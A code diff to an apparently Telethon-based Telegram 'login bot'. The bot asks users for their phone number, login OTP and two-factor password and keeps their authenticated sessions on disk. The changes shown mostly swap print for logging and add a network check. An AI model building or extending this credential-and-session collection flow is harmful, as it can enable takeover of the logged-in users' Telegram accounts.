@@ -1,8 +1,8 @@
 import os
 import requests
-from telegram import (
-    Update, InlineKeyboardButton, InlineKeyboardMarkup
-)
+import time
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, CommandHandler, MessageHandler, ConversationHandler,
     CallbackQueryHandler, ContextTypes, filters
@@ -32,13 +32,23 @@ def get_session_name(user_id):
     os.makedirs("sessions", exist_ok=True)
     return f"sessions/{user_id}"
 
+def network_check():
+    try:
+        response = requests.get("https://api.telegram.org")
+        if response.status_code == 200:
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException:
+        return False
+
 async def approve_user_in_main_bot(message: str):
     try:
         bot_url = f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/sendMessage"
         params = {"chat_id": MAIN_BOT_USERNAME, "text": message}
         requests.get(bot_url, params=params)
     except Exception as e:
-        print(f"❌ Error notifying main bot: {e}")
+        logging.error(f"❌ Error notifying main bot: {e}")
 
 def otp_keyboard(current_otp: str):
     """Return inline keypad with digits and clear/submit"""
@@ -61,6 +71,9 @@ def otp_keyboard(current_otp: str):
 
 # ---------------- LOGIN FLOW ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not network_check():
+        await update.message.reply_text("❌ Unable to connect to Telegram servers. Please check your network.")
+        return ConversationHandler.END
     await update.message.reply_text("📱 Send your phone number (with +countrycode):")
     return ASK_PHONE
 
@@ -79,11 +92,11 @@ async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         # Connect the client to the session
         await client.connect()
-        print(f"Connected to Telegram client for user {uid}.")
+        logging.info(f"Connected to Telegram client for user {uid}.")
 
         # Send the OTP request
         await client.send_code_request(phone)
-        print(f"OTP request sent for {phone}.")
+        logging.info(f"OTP request sent for {phone}.")
 
         user_clients[uid] = client
         user_otps[uid] = ""
@@ -94,7 +107,7 @@ async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ASK_OTP
 
     except Exception as e:
-        print(f"Error sending OTP: {e}")
+        logging.error(f"Error sending OTP: {e}")
         await update.message.reply_text(f"❌ Failed to send OTP: {e}")
         return ConversationHandler.END
 
@@ -138,8 +151,8 @@ async def otp_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     new_text, new_keyboard = otp_keyboard(user_otps[uid])
     try:
         await query.edit_message_text(new_text, parse_mode="Markdown", reply_markup=new_keyboard)
-    except:
-        pass
+    except Exception as e:
+        logging.error(f"Error updating OTP message: {e}")
     return ASK_OTP
 
 async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -161,6 +174,8 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ---------------- MAIN ----------------
 def main():
+    logging.basicConfig(level=logging.INFO)
+
     app = Application.builder().token(BOT_TOKEN).build()
 
     conv = ConversationHandler(
@@ -174,7 +189,7 @@ def main():
     )
 
     app.add_handler(conv)
-    print("✅ Login Bot with Inline Keypad is running...")
+    logging.info("✅ Login Bot with Inline Keypad is running...")
     app.run_polling()
 
 if __name__ == "__main__":
